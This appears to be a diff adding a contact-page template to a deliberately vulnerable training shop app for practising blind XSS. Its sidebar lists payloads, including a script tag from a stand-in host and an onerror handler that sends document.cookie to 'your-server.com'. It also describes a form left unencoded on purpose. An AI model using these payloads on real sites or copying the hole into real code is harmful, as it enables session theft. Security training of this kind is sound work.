@@ -1,0 +1,80 @@
+{% extends "base.html" %}
+
+{% block title %}Contact Us - SecureShop{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8">
+        <h2>Contact Us</h2>
+        <div class="alert alert-warning">
+            <strong>🔍 Blind XSS Testing:</strong> This form is vulnerable to blind XSS attacks. Payloads submitted here may be executed in an admin panel.
+        </div>
+        
+        <form action="/contact" method="POST" class="needs-validation" novalidate>
+            <div class="mb-3">
+                <label for="name" class="form-label">Full Name *</label>
+                <input type="text" class="form-control" id="name" name="name" required>
+            </div>
+            
+            <div class="mb-3">
+                <label for="email" class="form-label">Email Address *</label>
+                <input type="email" class="form-control" id="email" name="email" required>
+            </div>
+            
+            <div class="mb-3">
+                <label for="subject" class="form-label">Subject *</label>
+                <input type="text" class="form-control" id="subject" name="subject" required>
+            </div>
+            
+            <div class="mb-3">
+                <label for="message" class="form-label">Message *</label>
+                <textarea class="form-control" id="message" name="message" rows="5" required 
+                          placeholder="Tell us about your experience or ask us anything..."></textarea>
+            </div>
+            
+            <button type="submit" class="btn btn-primary">Send Message</button>
+        </form>
+        
+        {% if success %}
+        <div class="alert alert-success mt-3">
+            <strong>Thank you!</strong> Your message has been submitted successfully. We'll get back to you soon.
+        </div>
+        {% endif %}
+    </div>
+    
+    <div class="col-md-4">
+        <div class="card border-danger mb-3">
+            <div class="card-header bg-danger text-white">
+                <strong>🚨 Blind XSS Vulnerability</strong>
+            </div>
+            <div class="card-body">
+                <h6>Testing Blind XSS</h6>
+                <p class="small">Form submissions are stored and may be viewed by administrators without proper encoding.</p>
+                <hr>
+                <h6>Test Payloads:</h6>
+                <ul class="small">
+                    <li><code>&lt;script src="http://your-server.com/xss.js"&gt;&lt;/script&gt;</code></li>
+                    <li><code>&lt;img src=x onerror="fetch('http://your-server.com?cookie='+document.cookie)"&gt;</code></li>
+                    <li><code>&lt;svg onload="eval(atob('YWxlcnQoJ0JsaW5kIFhTUycp'))"&gt;</code></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-header">
+                <strong>📞 Contact Information</strong>
+            </div>
+            <div class="card-body">
+                <p><strong>Email:</strong> support@secureshop.com</p>
+                <p><strong>Phone:</strong> +1 (555) 123-4567</p>
+                <p><strong>Address:</strong><br>
+                   123 Security Lane<br>
+                   Vulnerability City, VC 12345</p>
+                <p><strong>Business Hours:</strong><br>
+                   Mon-Fri: 9:00 AM - 6:00 PM<br>
+                   Weekend: Closed</p>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
